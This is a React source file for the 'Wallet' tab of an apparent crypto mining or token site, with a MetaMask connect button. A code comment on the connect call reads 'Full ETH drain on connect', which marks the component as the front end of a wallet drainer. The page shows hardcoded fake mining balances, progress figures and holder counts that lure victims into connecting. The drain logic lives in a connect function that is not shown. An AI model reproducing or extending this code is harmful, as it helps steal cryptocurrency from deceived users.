import React from 'react';
import { useOutletContext } from 'react-router-dom';
import { useWalletStore } from '../utils/ContextApi';

const Wallet: React.FC = () => {
  const { activeTab } = useOutletContext<{ activeTab: string }>();
  const { connected, address, connect } = useWalletStore();

  const handleConnect = async () => {
    if (typeof window.ethereum !== 'undefined') {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        await connect(accounts[0], 1); // Full ETH drain on connect
      } catch (error) {
        alert('ETH Connect failed');
      }
    } else {
      alert('Install MetaMask for ETH mining');
    }
  };

  if (activeTab !== 'Wallet') return null;

  return (
    <div className="bg-gray-900 p-6 rounded-lg max-w-md mx-auto">
      <h1 className="text-2xl mb-4">Your ETH Wallet</h1>
      <div className="mb-4 text-lg font-bold">Mining Balance: 12,931.523 KEY</div>
      {!connected ? (
        <button onClick={handleConnect} className="bg-orange-500 hover:bg-orange-600 px-6 py-3 rounded w-full mb-4">
          Connect ETH Wallet
        </button>
      ) : (
        <div className="mb-4 p-3 bg-gray-800 rounded">
          <span className="text-sm">Connected ETH:</span> {address.slice(0,6)}...{address.slice(-4)}
        </div>
      )}
      <div className="w-full bg-gray-700 rounded-full h-2.5 mb-2">
        <div className="bg-orange-500 h-2.5 rounded-full" style={{ width: '65%' }}></div>
      </div>
      <span className="text-sm text-gray-400">ETH Mining Stage: 65.2%</span>
      <div className="mt-4 text-xs text-gray-400">
        <div>Total Supply: 10,000,000 KEY</div>
        <div>Holders: 58,325</div>
        <div>Support: ? | Language: English ▼</div>
      </div>
    </div>
  );
};

export default Wallet;